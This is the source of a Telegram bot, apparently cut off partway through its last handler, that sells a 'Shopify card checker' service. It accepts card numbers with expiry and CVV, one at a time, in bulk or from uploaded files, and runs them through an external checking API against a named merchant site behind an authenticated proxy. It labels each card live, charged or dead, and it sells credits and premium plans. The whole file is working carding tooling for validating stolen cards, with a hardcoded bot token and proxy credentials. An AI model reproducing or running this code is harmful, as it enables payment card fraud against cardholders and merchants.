#!/usr/bin/env python3
"""
💳 SHOPIFY CARD CHECKER TELEGRAM BOT — FINAL VERSION
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Features:
  ✅ /sh <card>        — Single CC check (1 credit)
  ✅ /msh <cards>      — Mass Shopify check (131 free, then 1 credit each)
  ✅ Send .txt file     — Auto-checks first 1000 cards for free
  ✅ /chk reply_to_file — Check remaining cards from file (1 credit each)
  ✅ Premium System     — Unlimited checks
  ✅ Redeem Codes       — /get_red by owner
  ✅ 4 Plans           — Basic/Monthly/Yearly/Lifetime
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
"""

import requests
import json
import time
import random
import string
import sqlite3
import os
import re
from datetime import datetime, timedelta
from concurrent.futures import ThreadPoolExecutor, as_completed
from io import BytesIO

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, CallbackQueryHandler
from telegram.constants import ParseMode

# ═══════════════════════════════════════════════════════════════════════
# CONFIGURATION
# ═══════════════════════════════════════════════════════════════════════

BOT_TOKEN = "8854554558:AAEYPmz9Vd0GqdbibAK8NR7HlXb4doHXOTM"
OWNER_ID = 8570832903
CONTACT_USERNAME = "@theaadikoder"

API_URL = "https://nik.cards/shopify"
SITE = "https://planterhomawholesale.com"
PROXY_STRING = "ca-mon.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2"
DEFAULT_AMOUNT = 1.00

# Free limits
FREE_FILE_CHECK_LIMIT = 1000   # Free users get 1000 checks from file
FREE_MSH_LIMIT = 131           # Free users get 131 checks via /msh

# Plans
PLANS = {
    "basic":    {"name": "Basic",     "price": 250,  "days": 1},
    "monthly":  {"name": "Monthly",   "price": 500,  "days": 30},
    "yearly":   {"name": "Yearly",    "price": 1000, "days": 365},
    "lifetime": {"name": "Lifetime",  "price": 2500, "days": 99999},
}

COST_PER_CHECK = 1

RESPONSE_MAP = {
    "APPROVED":                    {"status": "LIVE",     "charge": True,  "msg": "✅ APPROVED — payment successful"},
    "PAYMENTS_PRE_AUTH_SUCCESS":   {"status": "LIVE",     "charge": True,  "msg": "✅ Pre-auth SUCCESS — funds held"},
    "CAPTURED":                    {"status": "LIVE",     "charge": True,  "msg": "✅ CAPTURED — money received"},
    "SUCCESS":                     {"status": "LIVE",     "charge": True,  "msg": "✅ Transaction SUCCESSFUL"},
    "PAYMENTS_3DS_REQUIRED":       {"status": "CHARGE",   "charge": True,  "msg": "💰 3DS REQUIRED — has funds"},
    "PAYMENTS_AUTH_SUCCESS":       {"status": "LIVE",     "charge": False, "msg": "✅ Auth success — $0 check"},
    "PAYMENTS_ZERO_AUTH":          {"status": "LIVE",     "charge": False, "msg": "✅ $0 auth — card live"},
    "PROCESSING_ERROR":            {"status": "UNKNOWN",  "charge": False, "msg": "❓ Processing error — retry"},
    "TIMEOUT":                     {"status": "UNKNOWN",  "charge": False, "msg": "❓ Timeout — retry"},
    "THROTTLED":                   {"status": "UNKNOWN",  "charge": False, "msg": "❓ Rate limited — wait"},
    "GATEWAY_ERROR":               {"status": "UNKNOWN",  "charge": False, "msg": "❓ Gateway error"},
    "PAYMENTS_CREDIT_CARD_BASE_EXPIRED": {"status": "DEAD", "charge": False, "msg": "❌ Card EXPIRED"},
    "PAYMENTS_DECLINED":                 {"status": "DEAD", "charge": False, "msg": "❌ Declined"},
    "PAYMENTS_INVALID_CARD":             {"status": "DEAD", "charge": False, "msg": "❌ Invalid card"},
    "PAYMENTS_INVALID_CVV":              {"status": "DEAD", "charge": False, "msg": "❌ Invalid CVV"},
    "PAYMENTS_INVALID_EXPIRY":           {"status": "DEAD", "charge": False, "msg": "❌ Invalid expiry"},
    "PAYMENTS_CARD_DECLINED":            {"status": "DEAD", "charge": False, "msg": "❌ Declined"},
    "PAYMENTS_INSUFFICIENT_FUNDS":       {"status": "DEAD", "charge": False, "msg": "❌ INSUFFICIENT FUNDS"},
    "PAYMENTS_DO_NOT_HONOR":             {"status": "DEAD", "charge": False, "msg": "❌ Do not honor"},
    "PAYMENTS_RESTRICTED_CARD":          {"status": "DEAD", "charge": False, "msg": "❌ Restricted"},
    "PAYMENTS_CALL_ISSUER":              {"status": "DEAD", "charge": False, "msg": "❌ Call issuer"},
    "PAYMENTS_LOST_CARD":                {"status": "DEAD", "charge": False, "msg": "❌ Lost card"},
    "PAYMENTS_STOLEN_CARD":              {"status": "DEAD", "charge": False, "msg": "❌ Stolen card"},
    "PAYMENTS_PICKUP_CARD":              {"status": "DEAD", "charge": False, "msg": "❌ Pickup card"},
    "PAYMENTS_AMOUNT_LIMIT_EXCEEDED":    {"status": "DEAD", "charge": False, "msg": "❌ Amount limit exceeded"},
    "PAYMENTS_CVV_FAILURE":              {"status": "DEAD", "charge": False, "msg": "❌ CVV mismatch"},
    "PAYMENTS_AVS_FAILURE":              {"status": "DEAD", "charge": False, "msg": "❌ AVS mismatch"},
}

# ═══════════════════════════════════════════════════════════════════════
# DATABASE
# ═══════════════════════════════════════════════════════════════════════

DB_PATH = "bot_database.db"

def init_db():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS users (
        user_id INTEGER PRIMARY KEY,
        username TEXT,
        credits INTEGER DEFAULT 0,
        is_premium INTEGER DEFAULT 0,
        premium_expiry TEXT,
        plan_type TEXT,
        first_seen TEXT,
        last_use TEXT,
        free_file_checks INTEGER DEFAULT 0
    )''')
    c.execute('''CREATE TABLE IF NOT EXISTS redeem_codes (
        code TEXT PRIMARY KEY,
        credits INTEGER,
        duration_days INTEGER,
        duration_label TEXT,
        created_by INTEGER,
        used_by INTEGER,
        used_at TEXT,
        created_at TEXT,
        is_used INTEGER DEFAULT 0
    )''')
    c.execute('''CREATE TABLE IF NOT EXISTS check_history (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        user_id INTEGER,
        card_last4 TEXT,
        status TEXT,
        response TEXT,
        amount_charged REAL,
        checked_at TEXT
    )''')
    c.execute('''CREATE TABLE IF NOT EXISTS pending_files (
        user_id INTEGER,
        message_id INTEGER,
        cards TEXT,
        processed_count INTEGER DEFAULT 0,
        PRIMARY KEY (user_id, message_id)
    )''')
    conn.commit()
    conn.close()

# ─── DB HELPERS ──────────────────────────────────────────────────────

def get_user(user_id):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT * FROM users WHERE user_id = ?", (user_id,))
    user = c.fetchone()
    conn.close()
    return user

def create_user(user_id, username=None):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('''INSERT OR IGNORE INTO users (user_id, username, first_seen, last_use)
                 VALUES (?, ?, ?, ?)''',
              (user_id, username, datetime.now().isoformat(), datetime.now().isoformat()))
    conn.commit()
    conn.close()

def update_credits(user_id, amount):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("UPDATE users SET credits = credits + ?, last_use = ? WHERE user_id = ?",
              (amount, datetime.now().isoformat(), user_id))
    conn.commit()
    conn.close()

def get_credits(user_id):
    user = get_user(user_id)
    return user[2] if user else 0

def deduct_credit(user_id):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT credits, is_premium, premium_expiry FROM users WHERE user_id = ?", (user_id,))
    user = c.fetchone()
    if not user:
        conn.close()
        return False
    
    credits, is_premium, premium_expiry = user
    
    # Premium users don't consume credits
    if is_premium and premium_expiry:
        if premium_expiry == "lifetime":
            conn.close()
            return True
        try:
            exp = datetime.fromisoformat(premium_expiry)
            if exp > datetime.now():
                conn.close()
                return True
        except:
            pass
    
    if credits > 0:
        c.execute("UPDATE users SET credits = credits - 1, last_use = ? WHERE user_id = ?",
                  (datetime.now().isoformat(), user_id))
        conn.commit()
        conn.close()
        return True
    
    conn.close()
    return False

def check_premium(user_id):
    user = get_user(user_id)
    if not user or not user[3] or not user[4]:
        return False
    if user[4] == "lifetime":
        return True
    try:
        return datetime.fromisoformat(user[4]) > datetime.now()
    except:
        return False

def set_premium(user_id, days, plan_type="monthly"):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    if days >= 99999:
        c.execute('''UPDATE users SET is_premium = 1, premium_expiry = 'lifetime',
                     plan_type = ?, last_use = ? WHERE user_id = ?''',
                  (plan_type, datetime.now().isoformat(), user_id))
    else:
        expiry = (datetime.now() + timedelta(days=days)).isoformat()
        c.execute('''UPDATE users SET is_premium = 1, premium_expiry = ?,
                     plan_type = ?, last_use = ? WHERE user_id = ?''',
                  (expiry, plan_type, datetime.now().isoformat(), user_id))
    conn.commit()
    conn.close()

def get_free_file_checks(user_id):
    user = get_user(user_id)
    return user[8] if user and len(user) > 8 else 0

def increment_free_file_checks(user_id, amount=1):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("UPDATE users SET free_file_checks = free_file_checks + ?, last_use = ? WHERE user_id = ?",
              (amount, datetime.now().isoformat(), user_id))
    conn.commit()
    conn.close()

def generate_redeem_code(credits, duration, duration_label, created_by):
    chars = string.ascii_uppercase + string.digits
    code = ''.join(random.choices(chars, k=16))
    code = '-'.join([code[i:i+4] for i in range(0, 16, 4)])
    
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('''INSERT INTO redeem_codes (code, credits, duration_days, duration_label, created_by, created_at)
                 VALUES (?, ?, ?, ?, ?, ?)''',
              (code, credits, duration, duration_label, created_by, datetime.now().isoformat()))
    conn.commit()
    conn.close()
    return code

def use_redeem_code(code, user_id):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT * FROM redeem_codes WHERE code = ? AND is_used = 0", (code,))
    code_data = c.fetchone()
    if not code_data:
        conn.close()
        return False, "Invalid or already used code."
    
    credits = code_data[1]
    duration_days = code_data[2]
    duration_label = code_data[3]
    
    c.execute('''UPDATE redeem_codes SET is_used = 1, used_by = ?, used_at = ? WHERE code = ?''',
              (user_id, datetime.now().isoformat(), code))
    c.execute("UPDATE users SET credits = credits + ?, last_use = ? WHERE user_id = ?",
              (credits, datetime.now().isoformat(), user_id))
    
    if duration_days > 0:
        if duration_days >= 99999:
            c.execute('''UPDATE users SET is_premium = 1, premium_expiry = 'lifetime',
                         plan_type = 'redeem', last_use = ? WHERE user_id = ?''',
                      (datetime.now().isoformat(), user_id))
            expiry_str = "Lifetime"
        else:
            expiry = (datetime.now() + timedelta(days=duration_days)).isoformat()
            c.execute('''UPDATE users SET is_premium = 1, premium_expiry = ?,
                         plan_type = 'redeem', last_use = ? WHERE user_id = ?''',
                      (expiry, datetime.now().isoformat(), user_id))
            expiry_str = f"{duration_days} days"
    else:
        expiry_str = "N/A (credits only)"
    
    conn.commit()
    conn.close()
    return True, f"✅ Redeemed!\n• Credits: +{credits}\n• Premium: {duration_label} ({expiry_str})"

def log_check(user_id, card_last4, status, response, amount_charged):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('''INSERT INTO check_history (user_id, card_last4, status, response, amount_charged, checked_at)
                 VALUES (?, ?, ?, ?, ?, ?)''',
              (user_id, card_last4, status, response, amount_charged, datetime.now().isoformat()))
    conn.commit()
    conn.close()

def save_pending_file(user_id, message_id, cards_list):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    cards_json = json.dumps(cards_list)
    c.execute('''INSERT OR REPLACE INTO pending_files (user_id, message_id, cards, processed_count)
                 VALUES (?, ?, ?, 0)''',
              (user_id, message_id, cards_json))
    conn.commit()
    conn.close()

def get_pending_file(user_id, message_id):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT * FROM pending_files WHERE user_id = ? AND message_id = ?", (user_id, message_id))
    data = c.fetchone()
    conn.close()
    if data:
        return {"cards": json.loads(data[2]), "processed": data[3]}
    return None

def delete_pending_file(user_id, message_id):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("DELETE FROM pending_files WHERE user_id = ? AND message_id = ?", (user_id, message_id))
    conn.commit()
    conn.close()

def update_pending_processed(user_id, message_id, count):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("UPDATE pending_files SET processed_count = ? WHERE user_id = ? AND message_id = ?",
              (count, user_id, message_id))
    conn.commit()
    conn.close()

# ═══════════════════════════════════════════════════════════════════════
# CARD CHECKER ENGINE
# ═══════════════════════════════════════════════════════════════════════

def parse_proxy(proxy_str):
    parts = proxy_str.split(":")
    host, port, user, password = parts[0], parts[1], parts[2], parts[3]
    proxy_url = f"http://{user}:{password}@{host}:{port}"
    return {"http": proxy_url, "https": proxy_url}

def check_single_card(card_number, exp_month=None, exp_year=None, cvv=None, amount=DEFAULT_AMOUNT):
    cc_parts = [card_number]
    cc_parts.append(str(exp_month) if exp_month else "12")
    yr = str(exp_year) if exp_year else "28"
    cc_parts.append(yr[-2:] if len(yr) > 2 else yr)
    cc_parts.append(str(cvv) if cvv else "123")
    
    cc_string = "|".join(cc_parts)
    proxies = parse_proxy(PROXY_STRING)
    
    params = {"site": SITE, "cc": cc_string, "proxy": PROXY_STRING}
    
    try:
        resp = requests.get(
            API_URL, params=params, proxies=proxies, timeout=30,
            headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}
        )
        data = resp.json()
        response_code = data.get("Response", "")
        price_charged = data.get("Price", amount)
        
        classification = RESPONSE_MAP.get(response_code, {
            "status": "UNKNOWN", "charge": False, "msg": f"Unknown: {response_code}"
        })
        
        is_live = classification["status"] in ("LIVE", "CHARGE")
        was_charged = classification["charge"] and is_live
        
        return {
            "card_last4": card_number[-4:].rjust(4, "0"),
            "full_cc": cc_string,
            "response_code": response_code,
            "gateway": "Shopify Payments",
            "status": classification["status"],
            "charge_detected": was_charged,
            "amount_charged": price_charged if was_charged else 0.00,
            "message": classification["msg"],
            "raw_data": data,
        }
    except Exception as e:
        return {
            "status": "UNKNOWN",
            "message": f"❓ Error",
            "card_last4": card_number[-4:].rjust(4, "0"),
            "full_cc": cc_string,
            "response_code": "ERROR",
            "charge_detected": False,
            "amount_charged": 0.00
        }

def parse_card_line(line):
    line = line.strip()
    if not line:
        return None
    line = re.sub(r'^(cc|card|#|\d+[\.\)])\s*', '', line, flags=re.IGNORECASE)
    
    for sep in ['|', ':', ' ', '\t']:
        parts = line.split(sep)
        if len(parts) >= 2:
            card = re.sub(r'\D', '', parts[0])
            if 13 <= len(card) <= 19:
                month = parts[1] if len(parts) > 1 else None
                year = parts[2] if len(parts) > 2 else None
                cvv = parts[3] if len(parts) > 3 else None
                return {"number": card, "month": month, "year": year, "cvv": cvv}
    return None

def format_card_result(result, index=None):
    prefix = f"{index}. " if index else ""
    symbols = {"LIVE": "✅", "CHARGE": "💰", "UNKNOWN": "❓", "DEAD": "❌"}
    icon = symbols.get(result.get("status", "UNKNOWN"), "❓")
    
    line = f"{prefix}{icon} `{result.get('full_cc', 'N/A')}`\n"
    line += f"   ├ Status: {result.get('status', 'UNKNOWN')}\n"
    line += f"   ├ Response: {result.get('response_code', 'N/A')}\n"
    if result.get("charge_detected"):
        line += f"   ├ 💰 Charged: ${result.get('amount_charged', 0):.2f}\n"
    line += f"   └ {result.get('message', 'N/A')}"
    return line

# ═══════════════════════════════════════════════════════════════════════
# BOT HANDLERS
# ═══════════════════════════════════════════════════════════════════════

# ─── START ──────────────────────────────────────────────────────────

async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    create_user(user.id, user.username)
    
    if not check_premium(user.id) and get_credits(user.id) == 0:
        update_credits(user.id, 3)
    
    msg = (
        f"👋 **Welcome to Shopify Card Checker Bot!**\n\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"**Your Info:**\n"
        f"• User ID: `{user.id}`\n"
        f"• Credits: `{get_credits(user.id)}`\n"
        f"• Premium: `{'✅ Active' if check_premium(user.id) else '❌ Inactive'}`\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"**📌 Free Commands:**\n"
        f"• `/sh <card>` — Single check (1 credit)\n"
        f"• `/msh <cards>` — Mass check **(131 free!)**\n"
        f"• Send `.txt` file — Checks **1000 cards free!**\n"
        f"• `/chk` — Reply to a file to check remaining cards (1 credit each)\n\n"
        f"**Other Commands:**\n"
        f"• `/credits` — Your balance\n"
        f"• `/redeem <code>` — Redeem code\n"
        f"• `/plans` — Premium plans\n"
        f"• `/profile` — Your details\n\n"
        f"📩 **Contact:** {CONTACT_USERNAME}"
    )
    await update.message.reply_text(msg, parse_mode=ParseMode.MARKDOWN)

# ─── SINGLE CHECK: /sh ─────────────────────────────────────────────

async def sh_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """/sh <card> — Single card check, costs 1 credit"""
    user = update.effective_user
    create_user(user.id, user.username)
    
    if len(context.args) < 1:
        await update.message.reply_text(
            "❌ **Usage:** `/sh 4111111111111111|12|25|123`",
            parse_mode=ParseMode.MARKDOWN
        )
        return
    
    card_line = ' '.join(context.args)
    card_data = parse_card_line(card_line)
    
    if not card_data:
        await update.message.reply_text("❌ Invalid card format.")
        return
    
    if not check_premium(user.id) and get_credits(user.id) < 1:
        await update.message.reply_text(
            f"❌ **Insufficient credits!**\n"
            f"Balance: `{get_credits(user.id)}`\n"
            f"📩 Buy: {CONTACT_USERNAME}",
            parse_mode=ParseMode.MARKDOWN
        )
        return
    
    status_msg = await update.message.reply_text(
        f"🔍 Checking `**** **** **** {card_data['number'][-4:]}`...",
        parse_mode=ParseMode.MARKDOWN
    )
    
    if not check_premium(user.id):
        deduct_credit(user.id)
    
    result = check_single_card(card_data["number"], card_data["month"], card_data["year"], card_data["cvv"])
    log_check(user.id, result.get("card_last4"), result.get("status"),
              result.get("response_code"), result.get("amount_charged", 0))
    
    formatted = format_card_result(result)
    await status_msg.edit_text(
        f"**📊 Single Check Result**\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"{formatted}\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"👤 Credits: `{get_credits(user.id)}`",
        parse_mode=ParseMode.MARKDOWN
    )

# ─── MASS SHOPIFY CHECK: /msh ──────────────────────────────────────

async def msh_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """/msh <cards> — Mass Shopify check, 131 free for non-premium"""
    user = update.effective_user
    create_user(user.id, user.username)
    
    if len(context.args) < 1:
        await update.message.reply_text(
            "❌ **Usage:** `/msh 4111111111111111|12|25|123\\n5555555555554444|08|27|321`\n"
            "Or paste multiple cards in one message.",
            parse_mode=ParseMode.MARKDOWN
        )
        return
    
    text = ' '.join(context.args)
    lines = text.split('\\n') if '\\n' in text else text.split('\n')
    
    cards = []
    for line in lines:
        card_data = parse_card_line(line)
        if card_data:
            cards.append(card_data)
    
    if len(cards) == 0:
        await update.message.reply_text("❌ No valid cards found.")
        return
    
    is_premium = check_premium(user.id)
    credits_needed = len(cards)
    current_credits = get_credits(user.id)
    
    # Non-premium users get FREE_MSH_LIMIT free, then pay credits
    free_available = FREE_MSH_LIMIT if not is_premium else 0
    paid_needed = max(0, credits_needed - free_available)
    
    if not is_premium and current_credits < paid_needed:
        await update.message.reply_text(
            f"❌ **Insufficient credits!**\n"
            f"Cards: `{len(cards)}`\n"
            f"Free: `{FREE_MSH_LIMIT}` | Need credits: `{paid_needed}`\n"
            f"Your credits: `{current_credits}`\n\n"
            f"📩 Buy: {CONTACT_USERNAME}",
            parse_mode=ParseMode.MARKDOWN
        )
        return
    
    status_msg = await update.message.reply_text(
        f"🔍 Checking **{len(cards)}** card(s)...\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"Free checks: `{min(len(cards), free_available)}/{FREE_MSH_LIMIT}`\n"
        f"Paid checks: `{paid_needed}`\n"
        f"Credits: `{current_credits}`",
        parse_mode=ParseMode.MARKDOWN
    )
    
    results = []
    for i, card_data in enumerate(cards):
        # Deduct only if beyond free limit and not premium
        if i >= free_available and not is_premium:
            deduct_credit(user.id)
        
        result = check_single_card(card_data["number"], card_data["month"], card_data["year"], card_data["cvv"])
        results.append(result)
        log_check(user.id, result.get("card_last4"), result.get("status"),
                  result.get("response_code"), result.get("amount_charged", 0))
        
        if (i + 1) % 5 == 0 or i == len(cards) - 1:
            try:
                await status_msg.edit_text(
                    f"🔍 Checking... `{i+1}/{len(cards)}`",
                    parse_mode=ParseMode.MARKDOWN
                )
            except:
                pass
    
    lives = [r for r in results if r.get("status") == "LIVE"]
    charges = [r for r in results if r.get("status") == "CHARGE"]
    deads = [r for r in results if r.get("status") == "DEAD"]
    unknowns = [r for r in results if r.get("status") == "UNKNOWN"]
    
    response = (
        f"**📊 Mass Check — {len(results)} Cards**\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"✅ **LIVE:** `{len(lives)}`\n"
        f"💰 **CHARGE:** `{len(charges)}`\n"
        f"❌ **DEAD:** `{len(deads)}`\n"
        f"❓ **UNKNOWN:** `{len(unknowns)}`\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━\n"
    )
    
    live_charge = [r for r in results if r.get("status") in ("LIVE", "CHARGE")]
    if live_charge:
        response += "**✅ Live / 💰 Charge Cards:**\n"
        for r in live_charge[:10]:
            response += f"• `{r.get('full_cc', 'N/A')}` | {r.get('status')}"
            if r.get("charge_detected"):
                response += f" | 💰 ${r.get('amount_charged', 0):.2f}"
            response += "\n"
        if len(live_charge) > 10:
            response += f"  ... and `{len(live_charge) - 10}` more\n"
        response += "━━━━━━━━━━━━━━━━━━━━━━━━\n"
    
    response += f"👤 Credits left: `{get_credits(user.id)}`"
    
    await status_msg.edit_text(response, parse_mode=ParseMode.MARKDOWN)

# ─── TEXT MESSAGES (direct card input) ─────────────────────────────

async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    create_user(user.id, user.username)
    
    text = update.message.text.strip()
    if text.startswith('/'):
        return
    
    lines = text.split('\n')
    cards = []
    for line in lines:
        card_data = parse_card_line(line)
        if card_data:
            cards.append(card_data)
    
    if len(cards) == 0:
        await update.message.reply_text(
            "❌ No valid cards. Use `/sh <card>` or `/msh <cards>`.\n"
            "Send `.txt` file for bulk check.\n"
            "Use `/help` for commands.",
            parse_mode=ParseMode.MARKDOWN
        )
        return
    
    # Route to /msh logic
    context.args = [text]
    await msh_command(update, context)

# ─── FILE HANDLING ─────────────────────────────────────────────────

async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Auto-checks first 1000 cards free from .txt file."""
    user = update.effective_user
    create_user(user.id, user.username)
    
    document = update.message.document
    if not document.file_name.lower().endswith('.txt'):
        await update.message.reply_text("❌ Please upload a `.txt` file.")
        return
    
    # Download
    file = await document.get_file()
    file_bytes = await file.download_as_bytearray()
    content = file_bytes.decode('utf-8', errors='ignore')
    
    lines = content.split('\n')
    all_cards = []
    for line in lines:
        card_data = parse_card_line(line)
        if card_data:
            all_cards.append(card_data)
    
    if len(all_cards) == 0:
        await update.message.reply_text("❌ No valid cards found in file.")
        return
    
    is_premium = check_premium(user.id)
    total_cards = len(all_cards)
    
    # Free users get first FREE_FILE_CHECK_LIMIT cards free
    free_limit = FREE_FILE_CHECK_LIMIT if not is_premium else total_cards
    cards_to_check = all_cards[:free_limit]
    remaining_cards = all_cards[free_limit:]
    
    status_msg = await update.message.reply_text(
        f"📁 **File received — {total_cards} cards found**\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"✅ Checking: `{len(cards_to_check)}` cards (free)\n"
        f"{'📌 Remaining: ' + str(len(remaining_cards)) + ' cards — use /chk reply to this file' if remaining_cards else ''}\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"⏳ Processing...",
        parse_mode=ParseMode.MARKDOWN
    )
    
    # Save remaining cards for /chk
    if remaining_cards:
        save_pending_file(user.id, document.message_id, remaining_cards)
    
    # Process cards
    results = []
    for i, card_data in enumerate(cards_to_check):
        if not is_premium:
            increment_free_file_checks(user.id)
        
        result = check_single_card(card_data["number"], card_data["month"], card_data["year"], card_data["cvv"])
        results.append(result)
        log_check(user.id, result.get("card_last4"), result.get("status"),
                  result.get("response_code"), result.get("amount_charged", 0))
        
        if (i + 1) % 10 == 0 or i == len(cards_to_check) - 1:
            try:
                await status_msg.edit_text(
                    f"📁 Checking file... `{i+1}/{len(cards_to_check)}` cards\n"
                    f"{'📌 Remaining: ' + str(len(remaining_cards)) + ' (use /chk)' if remaining_cards else ''}",
                    parse_mode=ParseMode.MARKDOWN
                )
            except:
                pass
    
    lives = [r for r in results if r.get("status") == "LIVE"]
    charges = [r for r in results if r.get("status") == "CHARGE"]
    deads = [r for r in results if r.get("status") == "DEAD"]
    unknowns = [r for r in results if r.get("status") == "UNKNOWN"]
    
    response = (
        f"**📊 File Check — {len(results)} Cards**\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"✅ **LIVE:** `{len(lives)}`\n"
        f"💰 **CHARGE:** `{len(charges)}`\n"
        f"❌ **DEAD:** `{len(deads)}`\n"
        f"❓ **UNKNOWN:** `{len(unknowns)}`\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━\n"
    )
    
    live_charge = [r for r in results if r.get("status") in ("LIVE", "CHARGE")]
    if live_charge:
        response += "**✅ Live / 💰 Charge Cards:**\n"
        for r in live_charge[:10]:
            response += f"• `{r.get('full_cc', 'N/A')}` | {r.get('status')}"
            if r.get("charge_detected"):
                response += f" | 💰 ${r.get('amount_charged', 0):.2f}"
            response += "\n"
        if len(live_charge) > 10:
            response += f"  ... and `{len(live_charge) - 10}` more\n"
        response += "━━━━━━━━━━━━━━━━━━━━━━━━\n"
    
    if remaining_cards:
        response += f"📌 **{len(remaining_cards)} cards remaining.**\n"
        response += f"Reply to this file with `/chk` to check them (1 credit each).\n"
        response += "━━━━━━━━━━━━━━━━━━━━━━━━\n"
    
    response += f"👤 Credits: `{get_credits(user.id)}`"
    
    await status_msg.edit_text(response, parse_mode=ParseMode.MARKDOWN)

# ─── /CHK — Reply to file to check remaining cards ─────────────────

async def chk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """/chk — Reply to a file message to check remaining cards (costs credits)."""
    user = update.effective_user
    create_user(user.id, user.username)
    
    if not update.message.reply_to_message:
        await update.message.reply_text(
            "❌ **Usage:** Reply to a `.txt` file with `/chk`\n"
            "Example:\n"
            "1. Upload a file with 2000 cards\n"
            "2. First 1000 are checked free\n"
            "3. Reply to that file with `/chk` to check the remaining 1000 (1 credit each)",
            parse_mode=ParseMode.MARKDOWN
        )
        return
    
    replied = update.message.reply_to_message
    doc = replied.document
    
    if not doc or not doc.file_name.lower().endswith('.txt'):
        await update.message.reply_text("❌ Reply to a `.txt` file message.")
        return
    
    # Get pending file data
    pending = get_pending_file(user.id, doc.message_id)
    if not pending:
        await update.message.reply_text("❌ No pending cards for this file. Upload a new file.")
        return
    
    remaining_cards = pending["cards"]
    processed_so_far = pending["processed"]
    
    if len(remaining_cards) == 0:
        await update.message.reply_text("✅ All cards from this file have been checked!")
        delete_pending_file(user.id, doc.message_id)
        return
    
    is_premium = check_premium(user.id)
    credits_needed = len(remaining_cards)
    current_credits = get_credits(user.id)
    
    if not is_premium and current_credits < credits_needed:
        await update.message.reply_text(
            f"❌ **Insufficient credits!**\n"
            f"Remaining: `{len(remaining_cards)}` cards\n"
            f"Need: `{credits_needed}` credits\n"
            f"Have: `{current_credits}` credits\n\n"
            f"📩 Buy: {CONTACT_USERNAME}",
            parse_mode=ParseMode.MARKDOWN
        )
        return
    
    status_msg = await update.message.reply_text(
        f"🔍 Checking remaining **{len(remaining_cards)}** card(s)...\n"
        f"Cost: `{credits_needed}` credits",
        parse_mode=ParseMode.MARKDOWN
    )
    
    results = []
    for i, card_data in enumerate(remaining_cards):
        if not is_premium:
            deduct_credit(user.id)
        
        result = check_single_card(card_data["number"], card_data["month"], card_data["year"], card_data["cvv"])
        results.append(result)
        log_check(user.id, result.get("card_last4"), result.get("status"),
                  result.get("response_code"), result.get("amount_charged", 0))
        
        if (i + 1) % 10 == 0 or i == len(remaining_cards) - 1:
            try:
                await status_msg.edit_text(
                    f"🔍 Checking remaining... `{i+1}/{len(remaining_cards)}`",
                    parse_mode=ParseMode.MARKDOWN
                )
            except:
                pass
    
    # Delete pending file data
    delete_pending_file(user.id, doc.message_id)
    
    lives = [r for r in results if r.get("status") == "LIVE"]
    charges = [r for r in results if r.get("status") == "CHARGE"]
    deads = [r for r in results if r.get("status") == "DEAD"]
    unknowns = [r for r in results if r.get("status") == "UNKNOWN"]
    
    response = (
        f"**📊 Remaining Check — {len(results)} Cards**\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"✅ **LIVE:** `{len(lives)}`\n"
        f"💰 **CHARGE:** `{len(charges)}`\n"
        f"❌ **DEAD:** `{len(deads)}`\n"
        f"❓ **UNKNOWN:** `{len(unknowns)}`\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━\n"
    )
    
    live_charge = [r for r in results if r.get("status") in ("LIVE", "CHARGE")]
    if live_charge:
        response += "**✅ Live / 💰 Charge Cards:**\n"
        for r in live_charge[:10]:
            response += f"• `{r.get('full_cc', 'N/A')}` | {r.get('status')}"
            if r.get("charge_detected"):
                response += f" | 💰 ${r.get('amount_charged', 0):.2f}"
            response += "\n"
        if len(live_charge) > 10:
            response += f"  ... and `{len(live_charge) - 10}` more\n"
        response += "━━━━━━━━━━━━━━━━━━━━━━━━\n"
    
    response += f"👤 Credits left: `{get_credits(user.id)}`"
    
